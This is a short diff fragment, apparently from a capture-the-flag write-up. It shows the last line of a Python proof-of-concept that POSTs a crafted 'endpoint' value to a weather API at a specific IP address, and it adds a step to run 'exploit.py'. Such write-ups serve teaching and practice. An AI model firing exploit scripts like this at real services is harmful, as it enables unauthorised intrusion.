@@ -197,4 +197,7 @@ Write the POC
   17   │ requests.post('http://167.172.62.51:32440/api/weather', json={'endpoint': endpoint, 'city': 'lol', 'countr
        │ y': 'lol'})
 ```
-
+Execute the POC
+```sh
+$ python3 exploit.py
+```
